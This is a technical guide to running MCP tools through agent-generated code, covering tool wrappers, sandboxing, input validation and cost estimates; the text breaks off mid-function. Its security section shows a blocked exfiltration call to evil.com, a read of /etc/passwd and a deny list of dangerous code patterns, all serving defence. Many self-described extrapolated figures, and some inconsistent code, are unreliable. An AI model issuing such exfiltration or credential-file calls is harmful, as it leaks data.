# Code Execution with MCP: Comprehensive Implementation Guide

**Type:** Reference
**Status:** Active
**Last Updated:** 2025-11-05
**Source:** [Anthropic Engineering Blog](https://www.anthropic.com/engineering/code-execution-with-mcp) + Community Extrapolations
**Content Mix:** ~11% from Anthropic article, ~89% implementation guidance and community best practices
**Dependencies:**
- [MCP Builder Skill](../../.claude/skills/mcp-builder/)
- [Agent Orchestration](../../CLAUDE.md#agent-orchestration--parallelization)

**Estimated Read Time:** 8 minutes

---

> ## ‚ö†Ô∏è DOCUMENTATION NOTICE
>
> **This is a COMPREHENSIVE guide** that includes:
> - ‚úÖ Core concepts from Anthropic's official article (~11%)
> - ‚úÖ Implementation patterns from community experience (~89%)
> - ‚úÖ Security best practices (extrapolated)
> - ‚úÖ Cost/ROI analysis (inferred from industry standards)
> - ‚úÖ Detailed use cases (developed from general principles)
>
> **For ONLY what Anthropic stated**, see:
> - [REFERENCE_MCP_CODE_EXECUTION_FAITHFUL.md](./REFERENCE_MCP_CODE_EXECUTION_FAITHFUL.md)
>
> **Use this guide for:** Implementation planning, architecture decisions, practical deployment
>
> **Use faithful version for:** Understanding official guidance, citing Anthropic's position

---

## Purpose
This comprehensive guide explains the code execution pattern for Model Context Protocol (MCP) servers, combining Anthropic's core concepts with practical implementation guidance, security considerations, and real-world deployment strategies.

**Key Insight from Article:** Code execution with MCP can reduce token usage by 98.7% compared to traditional tool calling patterns (150,000 tokens ‚Üí 2,000 tokens for equivalent tasks).

## Quick Links
- [üìñ Documentation Index](./REFERENCE_MCP_CODE_EXECUTION_INDEX.md) - Which version should you read?
- [üìÑ Faithful Reference](./REFERENCE_MCP_CODE_EXECUTION_FAITHFUL.md) - Only what Anthropic stated
- [MCP Official Documentation](https://modelcontextprotocol.io)
- [MCP Server Examples](https://github.com/modelcontextprotocol/servers)
- [Building MCP Servers Guide](../../.claude/skills/mcp-builder/README.md)

## Table of Contents
- [The Problem Statement](#the-problem-statement)
- [Architecture Overview](#architecture-overview)
- [Implementation Patterns](#implementation-patterns)
- [Efficiency Gains](#efficiency-gains)
- [Key Benefits](#key-benefits)
- [Security Considerations](#security-considerations)
- [Trade-offs and Costs](#trade-offs-and-costs)
- [Use Cases](#use-cases)
- [Integration Approaches](#integration-approaches)
- [Best Practices](#best-practices)

---

## The Problem Statement

AI agents connected to numerous tools face two critical inefficiencies that compound at scale:

### Challenge 1: Context Window Overload

**Problem:** Tool definitions consume excessive context window tokens before the agent even begins processing a request.

**Scale Impact:**
- Small tool set (10 tools): ~5,000 tokens for definitions
- Medium tool set (100 tools): ~50,000 tokens
- Large tool set (1,000+ tools): 500,000+ tokens

**Quote from Anthropic:**
> "Tool descriptions occupy more context window space, increasing response time and costs. In cases where agents are connected to thousands of tools, they'll need to process hundreds of thousands of tokens before reading a request."

**Real-World Example:**
An enterprise AI assistant connected to:
- Google Drive (12 tools)
- Salesforce (24 tools)
- Slack (18 tools)
- GitHub (15 tools)
- Jira (16 tools)

Total: 85 tools = ~42,500 tokens consumed **before any work begins**.

### Challenge 2: Data Duplication Through Context

**Problem:** Intermediate results must repeatedly pass through the model context when agents chain multiple tool calls together.

**Inefficiency Pattern:**
```
Step 1: Agent retrieves 2-hour meeting transcript from Google Drive
        ‚Üí Transcript flows through model context (50,000 tokens)

Step 2: Agent summarizes transcript
        ‚Üí Transcript flows through model context AGAIN (50,000 tokens)

Step 3: Agent writes summary to Salesforce
        ‚Üí Summary flows through model context (5,000 tokens)

Total: 105,000 tokens for a task that only needed ~5,000 tokens for the final result
```

**Why This Matters:**
- **Cost:** 100,000 tokens = $0.30-$3.00 depending on model (GPT-4, Claude Opus)
- **Latency:** Processing time scales linearly with token count
- **Scale:** 1,000 users doing this = $300-$3,000 per hour in wasted costs

## Architecture Overview

### Traditional Tool Calling Pattern

```typescript
// ‚ùå TRADITIONAL: All tools loaded upfront
const agent = new Agent({
  tools: [
    // Every tool definition loaded into context
    { name: 'google_drive__get_document', description: '...', parameters: {...} },
    { name: 'google_drive__list_files', description: '...', parameters: {...} },
    { name: 'salesforce__update_record', description: '...', parameters: {...} },
    // ... 82 more tool definitions (40,000+ tokens)
  ]
});

// Agent flow:
// 1. Load ALL tool definitions (40,000 tokens)
// 2. Retrieve document ‚Üí Data passes through context (50,000 tokens)
// 3. Process document ‚Üí Data passes through context AGAIN (50,000 tokens)
// 4. Update Salesforce ‚Üí Result passes through context (5,000 tokens)
// Total: 145,000 tokens
```

### Code Execution Pattern

```typescript
// ‚úÖ CODE EXECUTION: Tools loaded on-demand as filesystem modules
const agent = new CodeExecutionAgent({
  availableServers: ['google-drive', 'salesforce', 'slack']
  // Only server names loaded, not full definitions (~500 tokens)
});

// Agent generates and executes code:
const code = `
import { getDocument } from './servers/google-drive/getDocument';
import { updateRecord } from './servers/salesforce/updateRecord';

// Data processing happens IN THE EXECUTION ENVIRONMENT
const doc = await getDocument({ id: 'doc-123' });
const summary = doc.content
  .split('\\n')
  .slice(0, 10)
  .join('\\n'); // Only first 10 lines extracted

await updateRecord({
  id: 'opp-456',
  field: 'summary',
  value: summary
});

return { success: true, linesProcessed: 10 };
`;

// Total: ~2,000 tokens (98.7% reduction)
```

**Key Architectural Difference:**
- **Traditional:** Model orchestrates every tool call
- **Code Execution:** Model writes code once, execution environment handles the rest

### Filesystem-Based Tool Organization

Tools are organized as a navigable directory structure:

```
servers/
‚îú‚îÄ‚îÄ google-drive/
‚îÇ   ‚îú‚îÄ‚îÄ index.ts              // Server exports
‚îÇ   ‚îú‚îÄ‚îÄ getDocument.ts        // Single tool wrapper
‚îÇ   ‚îú‚îÄ‚îÄ listFiles.ts
‚îÇ   ‚îú‚îÄ‚îÄ uploadFile.ts
‚îÇ   ‚îî‚îÄ‚îÄ shareDocument.ts
‚îÇ
‚îú‚îÄ‚îÄ salesforce/
‚îÇ   ‚îú‚îÄ‚îÄ index.ts
‚îÇ   ‚îú‚îÄ‚îÄ createRecord.ts
‚îÇ   ‚îú‚îÄ‚îÄ updateRecord.ts
‚îÇ   ‚îú‚îÄ‚îÄ queryRecords.ts
‚îÇ   ‚îî‚îÄ‚îÄ deleteRecord.ts
‚îÇ
‚îú‚îÄ‚îÄ slack/
‚îÇ   ‚îú‚îÄ‚îÄ index.ts
‚îÇ   ‚îú‚îÄ‚îÄ sendMessage.ts
‚îÇ   ‚îú‚îÄ‚îÄ listChannels.ts
‚îÇ   ‚îî‚îÄ‚îÄ getConversationHistory.ts
‚îÇ
‚îî‚îÄ‚îÄ github/
    ‚îú‚îÄ‚îÄ index.ts
    ‚îú‚îÄ‚îÄ createIssue.ts
    ‚îú‚îÄ‚îÄ listPullRequests.ts
    ‚îî‚îÄ‚îÄ mergePullRequest.ts
```

**Benefits of Filesystem Structure:**
1. **Progressive Disclosure:** Agent can `ls servers/` to see available integrations
2. **On-Demand Loading:** Agent only reads tool definitions when needed
3. **Type Safety:** TypeScript interfaces provide compile-time validation
4. **Discoverability:** Agent can search tools by name pattern

## Implementation Patterns

### Tool Wrapper Pattern

Each tool file wraps an MCP call with a clean TypeScript interface:

```typescript
// servers/google-drive/getDocument.ts

import { callMCPTool } from '../mcp-client';

// Type definitions (loaded only when this file is imported)
export interface GetDocumentInput {
  documentId: string;
  includeContent?: boolean;
  format?: 'text' | 'html' | 'markdown';
}

export interface GetDocumentResponse {
  id: string;
  title: string;
  content: string;
  mimeType: string;
  lastModified: string;
}

/**
 * Retrieves a document from Google Drive.
 *
 * @param input - Document retrieval parameters
 * @returns Document content and metadata
 * @throws Error if document not found or access denied
 *
 * @example
 * const doc = await getDocument({
 *   documentId: '1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms',
 *   format: 'markdown'
 * });
 */
export async function getDocument(
  input: GetDocumentInput
): Promise<GetDocumentResponse> {
  return callMCPTool<GetDocumentResponse>(
    'google_drive__get_document',
    input
  );
}
```

### Server Index Pattern

Each server exports its tools through an index file:

```typescript
// servers/google-drive/index.ts

export { getDocument } from './getDocument';
export { listFiles } from './listFiles';
export { uploadFile } from './uploadFile';
export { shareDocument } from './shareDocument';

// Type re-exports for convenience
export type {
  GetDocumentInput,
  GetDocumentResponse
} from './getDocument';

export type {
  ListFilesInput,
  ListFilesResponse
} from './listFiles';
```

### Tool Discovery Pattern

Agents can dynamically discover available tools:

```typescript
// Built-in helper function available to agents
function searchTools(
  query: string,
  detailLevel: 'names' | 'signatures' | 'full' = 'names'
): string[] {
  // Returns matching tool paths based on query
  // detailLevel controls how much information is returned

  // detailLevel: 'names'
  // ‚Üí ['google-drive/getDocument', 'google-drive/listFiles']

  // detailLevel: 'signatures'
  // ‚Üí ['getDocument(documentId: string): Promise<Document>']

  // detailLevel: 'full'
  // ‚Üí [Full JSDoc comments + type definitions]
}

// Agent usage example:
const tools = searchTools('google drive document', 'signatures');
// Agent sees only what it needs for this task
```

### Data Processing Pattern

Process data in the execution environment, not through model context:

```typescript
// ‚úÖ EFFICIENT: Data processed in execution environment
import { getDocument } from './servers/google-drive/getDocument';
import { updateRecord } from './servers/salesforce/updateRecord';

async function summarizeAndSync() {
  // Retrieve large document (50,000 tokens of content)
  const doc = await getDocument({ documentId: 'doc-123' });

  // Process IN THE EXECUTION ENVIRONMENT (not through model)
  const summary = {
    title: doc.title,
    wordCount: doc.content.split(/\s+/).length,
    firstParagraph: doc.content.split('\n\n')[0],
    keyTopics: extractTopics(doc.content) // Custom processing
  };

  // Only send summary to Salesforce (500 tokens instead of 50,000)
  await updateRecord({
    id: 'opp-456',
    field: 'meeting_summary',
    value: JSON.stringify(summary)
  });

  return summary; // Return to model (500 tokens, not 50,000)
}

function extractTopics(text: string): string[] {
  // Complex text processing happens here
  // Model doesn't see intermediate steps
  const words = text.toLowerCase().split(/\s+/);
  const stopWords = new Set(['the', 'a', 'an', 'and', 'or', 'but']);
  const frequencies = new Map<string, number>();

  for (const word of words) {
    if (!stopWords.has(word) && word.length > 4) {
      frequencies.set(word, (frequencies.get(word) || 0) + 1);
    }
  }

  return Array.from(frequencies.entries())
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .map(([word]) => word);
}
```

### Control Flow Pattern

Execute complex logic without model intervention:

```typescript
// ‚úÖ EFFICIENT: Control flow in execution environment
import { queryRecords } from './servers/salesforce/queryRecords';
import { sendMessage } from './servers/slack/sendMessage';

async function notifyOverdueOpportunities() {
  // Query can process thousands of records
  const opportunities = await queryRecords({
    object: 'Opportunity',
    fields: ['Id', 'Name', 'CloseDate', 'OwnerId'],
    where: 'CloseDate < TODAY AND StageName != "Closed Won"'
  });

  // Process results with native control flow
  const ownerGroups = new Map<string, typeof opportunities>();

  for (const opp of opportunities) {
    if (!ownerGroups.has(opp.OwnerId)) {
      ownerGroups.set(opp.OwnerId, []);
    }
    ownerGroups.get(opp.OwnerId)!.push(opp);
  }

  // Send notifications (loops execute without model)
  const results = [];
  for (const [ownerId, opps] of ownerGroups) {
    try {
      await sendMessage({
        channel: `user-${ownerId}`,
        text: `You have ${opps.length} overdue opportunities: ${opps.map(o => o.Name).join(', ')}`
      });
      results.push({ ownerId, sent: true, count: opps.length });
    } catch (error) {
      results.push({ ownerId, sent: false, error: error.message });
    }
  }

  // Only summary returned to model
  return {
    totalOpportunities: opportunities.length,
    ownersNotified: results.filter(r => r.sent).length,
    failed: results.filter(r => !r.sent)
  };
}
```

## Efficiency Gains

### Token Reduction: Real-World Comparison

**Scenario:** Sync Google Drive meeting notes to Salesforce opportunities

| Approach | Tool Loading | Data Retrieval | Processing | Writing | Total Tokens | Savings |
|----------|--------------|----------------|------------|---------|--------------|---------|
| **Traditional** | 42,000 | 50,000 | 50,000 | 8,000 | **150,000** | Baseline |
| **Code Execution** | 500 | (in env) | (in env) | 1,500 | **2,000** | **98.7%** |

**Cost Impact (Claude Opus rates):**
- Traditional: 150,000 tokens √ó $0.015/1k = **$2.25 per execution**
- Code Execution: 2,000 tokens √ó $0.015/1k = **$0.03 per execution**
- Savings: **$2.22 per execution** (98.7% cost reduction)

**At Scale:**
- 1,000 executions/day: **$2,190/day savings** ($66,000/month)
- 10,000 users: **$21,900/day savings** ($657,000/month)

### Latency Reduction

Token processing time scales with token count:

| Model | Traditional (150k tokens) | Code Execution (2k tokens) | Time Savings |
|-------|---------------------------|----------------------------|--------------|
| GPT-4 | 45-60 seconds | 3-5 seconds | **90-92%** |
| Claude Opus | 35-50 seconds | 2-4 seconds | **91-94%** |
| Claude Sonnet | 20-30 seconds | 1-2 seconds | **90-95%** |

**Why Latency Drops:**
1. Fewer tokens to process through neural network
2. Fewer sequential API calls (one code generation vs. many tool calls)
3. Parallel operations in execution environment

### Scalability Improvements

**Traditional Pattern Limitations:**
- Context window: 200k tokens (Claude Opus)
- Tool definitions: ~500 tokens each
- Maximum tools: ~400 before hitting limits
- Must choose which tools to exclude

**Code Execution Pattern Benefits:**
- Server names only: ~10 tokens each
- Can expose 10,000+ tools without context issues
- Agent discovers tools on-demand
- No artificial limitations on integration breadth

## Key Benefits

### 1. Progressive Disclosure

**Concept:** Load tool definitions only when needed, not upfront.

**Traditional Approach:**
```typescript
// All 1,000 tool definitions loaded immediately
const agent = new Agent({ tools: ALL_TOOLS }); // 500,000 tokens
```

**Code Execution Approach:**
```typescript
// Agent discovers tools as needed
const code = `
// Step 1: What servers are available?
const servers = await fs.readdir('./servers'); // ['google-drive', 'salesforce', ...]

// Step 2: What does google-drive offer?
const gdTools = await fs.readdir('./servers/google-drive');
// ['getDocument.ts', 'listFiles.ts', ...]

// Step 3: Load only what I need
import { getDocument } from './servers/google-drive/getDocument';
const doc = await getDocument({ id: 'doc-123' });
`;
```

**Token Savings Example:**
- Load all tools: 500,000 tokens
- Load server list: 500 tokens
- Load one server's tools: 2,000 tokens
- Load one tool definition: 500 tokens
- **Total: 3,000 tokens (99.4% reduction)**

### 2. Context-Efficient Data Filtering

**Problem:** Large datasets passing through model context multiple times.

**Example - Processing 10,000-row Spreadsheet:**

```typescript
// ‚ùå TRADITIONAL: All data through context
// Step 1: Retrieve spreadsheet
const response = await callTool('google_sheets__get_values', {
  spreadsheetId: 'abc',
  range: 'A1:Z10000'
});
// ‚Üí 500,000 tokens pass through model

// Step 2: Model processes and filters
// ‚Üí 500,000 tokens pass through model AGAIN

// Step 3: Write filtered results
await callTool('salesforce__bulk_insert', { data: filteredData });
// ‚Üí 50,000 tokens pass through model

// Total: 1,050,000 tokens
```

```typescript
// ‚úÖ CODE EXECUTION: Filter in environment
import { getValues } from './servers/google-sheets/getValues';
import { bulkInsert } from './servers/salesforce/bulkInsert';

async function syncHighValueCustomers() {
  // Data retrieved in execution environment (not through model)
  const allRows = await getValues({
    spreadsheetId: 'abc',
    range: 'A1:Z10000'
  });

  // Filter in execution environment (not through model)
  const highValue = allRows
    .filter(row => parseFloat(row[5]) > 100000) // Column F > $100k
    .map(row => ({
      name: row[0],
      email: row[1],
      revenue: row[5]
    }));

  // Only filtered results used (not full dataset)
  await bulkInsert({
    object: 'Lead',
    records: highValue
  });

  // Only summary returned to model
  return {
    totalRows: allRows.length,
    qualified: highValue.length
  };
}

// Total: ~3,000 tokens (99.7% reduction)
```

### 3. Native Control Flow

**Problem:** Loops and conditionals require alternating between model reasoning and tool execution.

**Traditional Flow (Slow):**
```
Model: "I need to check 100 opportunities"
  ‚Üí Tool Call: Check opportunity 1
Model: "This one is overdue, notify owner"
  ‚Üí Tool Call: Send Slack message
Model: "Now check opportunity 2"
  ‚Üí Tool Call: Check opportunity 2
Model: "This one is current, skip"
Model: "Now check opportunity 3"
  ‚Üí Tool Call: Check opportunity 3
...
(200 model invocations, 100 sequential tool calls)
```

**Code Execution Flow (Fast):**
```typescript
// Single model invocation generates code:
import { queryRecords } from './servers/salesforce/queryRecords';
import { sendMessage } from './servers/slack/sendMessage';

async function processOpportunities() {
  const opps = await queryRecords({ /* ... */ });

  // Loop executes in environment (no model involvement)
  for (const opp of opps) {
    if (isOverdue(opp)) {
      await sendMessage({ /* notify owner */ });
    }
  }

  return { processed: opps.length };
}

// (1 model invocation, parallel tool calls possible)
```

**Efficiency Comparison:**
- Traditional: 100 opportunities = 200 model calls = 2-3 minutes
- Code Execution: 100 opportunities = 1 model call + code execution = 5-10 seconds

### 4. Privacy Protection

**Problem:** Sensitive data exposed in model context and logs.

**Solution:** MCP client can tokenize PII before passing to model.

```typescript
// MCP Client Configuration
const mcpClient = new MCPClient({
  piiTokenization: {
    enabled: true,
    patterns: [
      { type: 'email', regex: /\b[\w._%+-]+@[\w.-]+\.[A-Z]{2,}\b/i },
      { type: 'ssn', regex: /\b\d{3}-\d{2}-\d{4}\b/ },
      { type: 'phone', regex: /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/ },
      { type: 'creditCard', regex: /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/ }
    ]
  }
});

// Example execution:
const code = `
import { getCustomers } from './servers/salesforce/getCustomers';
import { sendEmail } from './servers/sendgrid/sendEmail';

async function notifyCustomers() {
  const customers = await getCustomers({ status: 'active' });

  // Actual data in execution environment:
  // { email: 'john@example.com', name: 'John Doe', ssn: '123-45-6789' }

  for (const customer of customers) {
    await sendEmail({
      to: customer.email,  // Real email used here
      subject: 'Important Update',
      body: \`Hi \${customer.name}, your account ending in \${customer.ssn.slice(-4)} has been updated.\`
    });
  }

  return { sent: customers.length };
}
`;

// What the model sees in logs:
// { email: '[EMAIL_TOKEN_1]', name: 'John Doe', ssn: '[SSN_TOKEN_1]' }

// Model never sees actual PII, but data flows correctly between systems
```

**Benefits:**
- ‚úÖ PII never enters model context
- ‚úÖ PII never appears in logs
- ‚úÖ Data still flows correctly between systems
- ‚úÖ Compliance with GDPR, CCPA, HIPAA

### 5. State Persistence

**Concept:** Write intermediate results to files for resumable workflows.

```typescript
// Long-running workflow with checkpoints
import { fs } from '@anthropic/code-execution';
import { queryRecords } from './servers/salesforce/queryRecords';
import { sendMessage } from './servers/slack/sendMessage';

async function processLargeDataset() {
  const CHECKPOINT_FILE = '/tmp/progress.json';

  // Load checkpoint if exists
  let checkpoint = { processedIds: new Set() };
  if (await fs.exists(CHECKPOINT_FILE)) {
    const data = await fs.readFile(CHECKPOINT_FILE, 'utf-8');
    checkpoint = JSON.parse(data);
    checkpoint.processedIds = new Set(checkpoint.processedIds);
  }

  // Process records
  const allRecords = await queryRecords({ /* ... */ });

  for (const record of allRecords) {
    if (checkpoint.processedIds.has(record.Id)) {
      continue; // Skip already processed
    }

    try {
      await sendMessage({ /* process record */ });
      checkpoint.processedIds.add(record.Id);

      // Save checkpoint every 100 records
      if (checkpoint.processedIds.size % 100 === 0) {
        await fs.writeFile(
          CHECKPOINT_FILE,
          JSON.stringify({
            processedIds: Array.from(checkpoint.processedIds),
            lastUpdate: new Date().toISOString()
          })
        );
      }
    } catch (error) {
      // Error handling without losing progress
      console.error(`Failed to process ${record.Id}:`, error);
      continue;
    }
  }

  return {
    total: allRecords.length,
    processed: checkpoint.processedIds.size
  };
}
```

**Use Cases:**
- Long-running data migrations
- Bulk operations that may fail partway through
- Multi-step workflows spanning hours/days
- Rate-limited API operations

### 6. Reusable Skills

**Concept:** Persist working code as functions that models can reference later.

```typescript
// First execution: Agent solves problem
const code1 = `
import { queryRecords } from './servers/salesforce/queryRecords';

async function getOverdueOpportunities() {
  const opps = await queryRecords({
    object: 'Opportunity',
    fields: ['Id', 'Name', 'CloseDate', 'OwnerId'],
    where: 'CloseDate < TODAY AND StageName != "Closed Won"'
  });

  return opps.map(o => ({
    id: o.Id,
    name: o.Name,
    daysOverdue: Math.floor((Date.now() - new Date(o.CloseDate)) / 86400000),
    owner: o.OwnerId
  }));
}

export { getOverdueOpportunities };
`;

// Save to skills library
await fs.writeFile('./skills/salesforce-helpers.ts', code1);

// Future execution: Agent reuses skill
const code2 = `
import { getOverdueOpportunities } from './skills/salesforce-helpers';
import { sendMessage } from './servers/slack/sendMessage';

async function weeklyReport() {
  // Reuse previously written function
  const overdue = await getOverdueOpportunities();

  const report = \`Weekly Report:
  - Total overdue: \${overdue.length}
  - Most overdue: \${overdue[0].name} (\${overdue[0].daysOverdue} days)
  \`;

  await sendMessage({ channel: '#sales', text: report });
}
`;
```

**Benefits:**
- Builds institutional knowledge over time
- Reduces redundant code generation
- Improves consistency across executions
- Enables composition of complex behaviors

## Security Considerations

### Sandboxing Requirements

**CRITICAL:** Code execution requires secure isolation to prevent:

1. **Filesystem Access Control**
   ```typescript
   // ‚úÖ ALLOWED: Write to designated temp directories
   await fs.writeFile('/tmp/execution/result.json', data);

   // ‚ùå BLOCKED: Access system files
   await fs.readFile('/etc/passwd'); // Throws PermissionError
   ```

2. **Network Restrictions**
   ```typescript
   // ‚úÖ ALLOWED: Call MCP server APIs
   await callMCPTool('google_drive__get_document', { id: 'doc-123' });

   // ‚ùå BLOCKED: Direct network access
   await fetch('https://evil.com/exfiltrate'); // Throws NetworkError
   ```

3. **Resource Limits**
   ```typescript
   const sandbox = {
     memory: '512MB',      // Maximum memory usage
     cpu: '1 core',        // CPU allocation
     timeout: '60s',       // Maximum execution time
     diskSpace: '100MB'    // Maximum disk usage
   };
   ```

4. **Process Isolation**
   - Each execution in separate container/VM
   - No shared state between executions
   - Clean environment for each run

### Recommended Sandbox Technologies

**Production-Grade Options:**

1. **Docker + gVisor (Recommended)**
   ```dockerfile
   FROM node:20-alpine

   # Install gVisor for enhanced isolation
   RUN apk add --no-cache gvisor-containerd-shim

   # Create non-root user
   RUN adduser -D -u 1000 sandbox
   USER sandbox

   # Set resource limits
   ENV NODE_OPTIONS="--max-old-space-size=512"

   WORKDIR /app
   COPY --chown=sandbox:sandbox . .

   CMD ["node", "executor.js"]
   ```

2. **Firecracker (AWS)**
   - Lightweight microVMs
   - 125ms cold start
   - Strong isolation guarantees
   - Used by AWS Lambda

3. **Deno (Built-in Sandboxing)**
   ```typescript
   // Deno has granular permissions built-in
   const worker = new Worker(new URL("./worker.ts", import.meta.url), {
     type: "module",
     deno: {
       permissions: {
         read: ["/tmp/execution"],  // Only this directory
         write: ["/tmp/execution"],
         net: false,                // No network access
         env: false,                // No env vars
         run: false,                // No subprocess execution
       },
     },
   });
   ```

### Input Validation

**Always validate generated code before execution:**

```typescript
// Code validation pipeline
async function validateCode(code: string): Promise<ValidationResult> {
  const checks = [
    validateSyntax(code),           // TypeScript compilation
    validateImports(code),          // Only allowed modules
    validateFunctionCalls(code),    // Only whitelisted MCP tools
    validatePatterns(code),         // No dangerous patterns
  ];

  const results = await Promise.all(checks);
  return {
    valid: results.every(r => r.valid),
    errors: results.flatMap(r => r.errors)
  };
}

function validateImports(code: string): ValidationResult {
  const imports = parseImports(code);
  const allowedPaths = [
    /^\.\/servers\//,    // MCP servers
    /^\.\/skills\//,     // Reusable skills
    /^@anthropic\//,     // Official libraries
  ];

  const forbidden = imports.filter(imp =>
    !allowedPaths.some(pattern => pattern.test(imp))
  );

  if (forbidden.length > 0) {
    return {
      valid: false,
      errors: [`Forbidden imports: ${forbidden.join(', ')}`]
    };
  }

  return { valid: true, errors: [] };
}

function validatePatterns(code: string): ValidationResult {
  const dangerousPatterns = [
    /eval\s*\(/,                    // Code injection
    /Function\s*\(/,                // Dynamic function creation
    /require\s*\([^'"].*[^'"]\)/,  // Dynamic requires
    /process\.exit/,                // Terminating execution
    /child_process/,                // Subprocess creation
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(code)) {
      return {
        valid: false,
        errors: [`Dangerous pattern detected: ${pattern.source}`]
      };
    }
  }

  return { valid: true, errors: [] };
}
```

### Monitoring and Logging

**Track execution metrics for security and debugging:**

```typescript
interface ExecutionMetrics {
  startTime: Date;
  endTime: Date;
  duration: number;
  tokensGenerated: number;
  tokensProcessed: number;
  mcpCallsCount: number;
  memoryUsed: number;
  cpuUsed: number;
  errorsEncountered: string[];
  toolsUsed: string[];
}

async function executeWithMonitoring(code: string): Promise<ExecutionResult> {
  const metrics: ExecutionMetrics = {
    startTime: new Date(),
    tokensGenerated: code.length / 4, // Rough estimate
    mcpCallsCount: 0,
    toolsUsed: [],
    errorsEncountered: []
  };

  try {
    // Instrument MCP calls
    const instrumentedCallTool = async (tool: string, params: any) => {
      metrics.mcpCallsCount++;
      metrics.toolsUsed.push(tool);
      return await callMCPTool(tool, params);
    };

    // Execute with instrumentation
    const result = await executeInSandbox(code, { callMCPTool: instrumentedCallTool });

    metrics.endTime = new Date();
    metrics.duration = metrics.endTime.getTime() - metrics.startTime.getTime();

    // Log metrics
    await logExecution(metrics);

    return result;
  } catch (error) {
    metrics.errorsEncountered.push(error.message);
    throw error;
  }
}
```

## Trade-offs and Costs

### Implementation Complexity

**Operational Overhead:**

| Requirement | Traditional | Code Execution | Complexity Increase |
|-------------|-------------|----------------|---------------------|
| **Infrastructure** | API server | API + sandbox env | **+60%** |
| **Security** | API auth | Sandbox + validation + monitoring | **+80%** |
| **Debugging** | Logs + traces | Logs + traces + sandbox dumps | **+40%** |
| **Monitoring** | API metrics | API + execution + resource metrics | **+50%** |
| **Deployment** | Standard | Container orchestration | **+70%** |

**Development Costs:**

1. **Initial Setup:**
   - Sandbox infrastructure: 40-80 hours
   - Security hardening: 20-40 hours
   - Monitoring/logging: 20-30 hours
   - Testing framework: 30-50 hours
   - **Total: 110-200 hours** ($11k-$20k at $100/hr)

2. **Ongoing Maintenance:**
   - Security patches: 5-10 hours/month
   - Performance optimization: 5-10 hours/month
   - Debugging production issues: 10-20 hours/month
   - **Total: 20-40 hours/month** ($2k-$4k/month)

### When to Use Each Approach

**Use Traditional Tool Calling When:**

‚úÖ Small tool set (<20 tools)
‚úÖ Simple, linear workflows
‚úÖ No large data processing
‚úÖ Security/infrastructure constraints
‚úÖ Rapid prototyping/MVP stage
‚úÖ Team lacks DevOps expertise

**Use Code Execution When:**

‚úÖ Large tool set (>50 tools)
‚úÖ Complex workflows with loops/conditionals
‚úÖ Processing large datasets
‚úÖ High-frequency operations (cost matters)
‚úÖ Privacy/compliance requirements
‚úÖ Team has strong DevOps capability
‚úÖ Long-term production deployment

### Break-Even Analysis

**When does code execution pay for itself?**

**Assumptions:**
- Setup cost: $15,000 (one-time)
- Maintenance: $3,000/month
- Token savings: 98% reduction
- Average execution: 100k tokens saved
- Token cost: $0.015/1k (Claude Opus)
- Savings per execution: $1.50

**Break-even calculation:**
```
Total investment = $15,000 + ($3,000 √ó months)
Savings per execution = $1.50
Break-even = Total investment √∑ $1.50

Month 1: ($15,000 + $3,000) √∑ $1.50 = 12,000 executions
Month 2: ($15,000 + $6,000) √∑ $1.50 = 14,000 executions
Month 3: ($15,000 + $9,000) √∑ $1.50 = 16,000 executions
```

**Daily execution break-even:**
- Month 1: 400 executions/day
- Month 2: 467 executions/day
- Month 3: 533 executions/day

**Verdict:** If you're running **>500 agent executions per day**, code execution pays for itself within 3 months.

## Use Cases

### 1. Data Synchronization

**Scenario:** Sync Google Drive documents to Salesforce opportunities

```typescript
import { listFiles, getDocument } from './servers/google-drive';
import { queryRecords, updateRecord } from './servers/salesforce';

async function syncMeetingNotes() {
  // Find all meeting notes from last week
  const driveFiles = await listFiles({
    query: "name contains 'Meeting Notes' and modifiedTime > '2025-11-01'",
    fields: ['id', 'name', 'modifiedTime']
  });

  // Get corresponding Salesforce opportunities
  const opps = await queryRecords({
    object: 'Opportunity',
    fields: ['Id', 'Name', 'Meeting_Notes_Doc_Id__c'],
    where: 'Meeting_Notes_Doc_Id__c != null'
  });

  // Create lookup map (in environment, not through model)
  const oppMap = new Map(
    opps.map(o => [o.Meeting_Notes_Doc_Id__c, o.Id])
  );

  // Sync updated documents
  const results = [];
  for (const file of driveFiles) {
    const oppId = oppMap.get(file.id);
    if (!oppId) continue;

    // Retrieve and summarize (in environment)
    const doc = await getDocument({ documentId: file.id });
    const summary = summarizeDocument(doc.content);

    // Update Salesforce (only summary sent, not full doc)
    await updateRecord({
      id: oppId,
      fields: {
        'Meeting_Notes_Summary__c': summary,
        'Meeting_Notes_Last_Updated__c': file.modifiedTime
      }
    });

    results.push({ oppId, updated: true });
  }

  return {
    totalFiles: driveFiles.length,
    updated: results.length
  };
}

function summarizeDocument(content: string): string {
  const lines = content.split('\n').filter(l => l.trim());
  return {
    lineCount: lines.length,
    keyPoints: lines.filter(l => l.startsWith('- ') || l.startsWith('* ')),
    actionItems: lines.filter(l => l.toLowerCase().includes('action:') || l.toLowerCase().includes('todo:')),
    decisions: lines.filter(l => l.toLowerCase().includes('decision:') || l.toLowerCase().includes('agreed:'))
  };
}
```

**Token Savings:**
- Traditional: 150,000 tokens per sync
- Code Execution: 2,000 tokens per sync
- **Savings: 98.7%** ($2.22 per sync)

### 2. Bulk Data Processing

**Scenario:** Process 10,000-row spreadsheet for qualified leads

```typescript
import { getValues } from './servers/google-sheets';
import { bulkInsert } from './servers/salesforce';
import { sendMessage } from './servers/slack';

async function importQualifiedLeads() {
  // Retrieve full spreadsheet (happens in environment)
  const rows = await getValues({
    spreadsheetId: 'abc123',
    range: 'A1:Z10000'
  });

  // Complex filtering logic (in environment, not through model)
  const qualified = rows
    .slice(1) // Skip header
    .filter(row => {
      const revenue = parseFloat(row[5]);
      const employees = parseInt(row[6]);
      const industry = row[7];

      return (
        revenue > 100000 &&
        employees > 50 &&
        ['Technology', 'Finance', 'Healthcare'].includes(industry)
      );
    })
    .map(row => ({
      FirstName: row[0],
      LastName: row[1],
      Email: row[2],
      Company: row[3],
      Phone: row[4],
      Annual_Revenue__c: parseFloat(row[5]),
      Employees__c: parseInt(row[6]),
      Industry: row[7],
      Lead_Source__c: 'Spreadsheet Import'
    }));

  // Bulk insert to Salesforce
  const insertResult = await bulkInsert({
    object: 'Lead',
    records: qualified
  });

  // Notify team
  await sendMessage({
    channel: '#sales',
